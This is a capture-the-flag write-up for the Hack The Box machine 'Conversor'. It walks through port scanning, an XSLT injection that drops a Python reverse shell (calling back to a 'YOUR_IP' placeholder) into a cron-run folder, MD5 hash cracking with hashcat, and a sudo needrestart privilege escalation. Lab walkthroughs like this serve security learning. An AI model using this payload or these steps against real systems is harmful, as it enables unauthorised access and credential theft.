---
title: "Conversor - Hack The Box"
summary: "Difficulty: Easy 🟢"
---

<style>

h6 {
  text-align: center;
  font-style: italic;
  font-weight: normal;
  position: relative;
  top: -10px;
}

img {
    display: flex !important;
    margin: 0 auto !important;
    justify-content: center !important;
    border-radius: 14px;
    border: 2px solid #4a90e2;
    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
    transition: box-shadow 0.3s ease, transform 0.3s ease;
}
img:hover {
    box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
    transform: scale(1.03);
}

</style>

[Machine Link](https://app.hackthebox.com/machines/Conversor)

![0](/images/writeups/conversor/0.png)

---

We will start with a quick port scan using [**NMAP**](https://nmap.org/) to see **which ports are open**.

```
sudo nmap -sS --min-rate 4500 -n -Pn 10.10.11.92 -vvv
```

![1](/images/writeups/conversor/1.png)

Now that we know **ports 22 and 80 are open**, we will run a more **detailed scan** on those.

```
nmap -sCV -p22,80 -n -Pn 10.10.11.92 -oN target
```

![2](/images/writeups/conversor/2.png)

We are going to visit the **website** running on **port 80**, but first we will add an entry in ***/etc/hosts*** mapping the domain `conversor.htb` to its `IP`.

![3](/images/writeups/conversor/3.png)

When we go to the site it shows the typical **login**. Since we don’t have any user yet, we will register and explore to see if anything is misconfigured behind the website.

![4](/images/writeups/conversor/4.png)

After logging in, the site shows a platform called **Conversor**, whose purpose is to **transform Nmap results into a more visual format**. It allows uploading an **XML** file together with an **XSLT** template to perform the conversion. In addition, the website provides us with an **XSLT template**.

If we go to **About** we can download the web application’s **source code**.

![5](/images/writeups/conversor/5.png)

Once extracted, we will start looking for files with sensitive information to see how we might get access to the machine.

![6](/images/writeups/conversor/6.png)

We find the **users database**, but as this is just the base code, it is empty.
On the other hand, in ***app.py*** we see that the `convert()` function **allows uploading an XML and an XSLT** (as we saw earlier when logging in), saving them and **executing the XSLT directly** with no restrictions:

![7](/images/writeups/conversor/7.png)

Any **XSLT** we upload will be executed with no checks, so we can exploit an **XSLT injection**.

If we read ***install.md*** we see there is a cron that **every minute executes all scripts in */var/www/conversor.htb/scripts/***, so if we can insert a script there by exploiting the **XSLT injection**, it will be executed as **www-data** and we could, for example, get a **Reverse Shell**.

![8](/images/writeups/conversor/8.png)

We will exploit it using [**EXSLT**](https://exslt.github.io/exsl/elements/document/), an **XSLT extension** that adds advanced functions.

First, **download the XSLT template** provided by the site and run **Nmap** again, this time outputting **XML**.

```
nmap conversor.htb -oX nmap.xml
```

Upload both files to check if it works.

![9](/images/writeups/conversor/9.png)

![10](/images/writeups/conversor/10.png)

Perfect, the Nmap scan results are displayed more nicely.

Now it is time to **exploit the XSLT injection** to create a file in ***/var/www/conversor.htb/scripts/***: I built a **malicious XSLT** that uses the `exsl:document` extension from [**EXSLT**](https://exslt.github.io/exsl/elements/document/) to generate files.

```xslt
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet 
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
    xmlns:revshell="http://exslt.org/common"
    extension-element-prefixes="revshell"
    version="1.0">
  <xsl:template match="/">
    <revshell:document href="/var/www/conversor.htb/scripts/revshell.py" method="text">
import os,pty,socket
s=socket.socket()
s.connect(("YOUR_IP",4444))
[os.dup2(s.fileno(),f)for f in(0,1,2)]
pty.spawn("/bin/bash")
    </revshell:document>
  </xsl:template>
</xsl:stylesheet>
```

With this ready, we will listen on **port 4444** and wait one minute to receive the **Reverse Shell**.

![11](/images/writeups/conversor/11.png)

We will now **configure the TTY** to obtain a stable interactive shell.

```
python3 -c 'import pty; pty.spawn("/bin/bash")';

Ctrl + Z

stty raw -echo;fg
  reset xterm

export TERM=xterm
```

## Privilege escalation to Fismathack

If we remember from earlier when we reviewed the web app source code, we found the **users database**, now that we have internal access to the machine, we can query it.

![12](/images/writeups/conversor/12.png)

Reading the **users table** shows the users and their corresponding **MD5 hashed password**s.

![13](/images/writeups/conversor/13.png)

If we check the local users we see that **fismathack** exists, so we are going to **crack their password** to see if they use the same one on the machine.

![14](/images/writeups/conversor/14.png)

For cracking I will use [**hashcat**](https://hashcat.net/hashcat/).

```
hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt --username
```

![15](/images/writeups/conversor/15.png)

We log in as **fismathack** and obtain the **User Flag**.

![16](/images/writeups/conversor/16.png)


## Privilege escalation to Root

Running `sudo -l` we check that we can run **needrestart** as any user without a password.

![17](/images/writeups/conversor/17.png)

This is vulnerable because it lets us read any file on the system [**Needrestart Sudo PE**](https://medium.com/@momo334678/needrestart-sudo-privilege-escalation-44ae1c89bcc2).

Finally, we obtain the **Root Flag**.

![18](/images/writeups/conversor/18.png)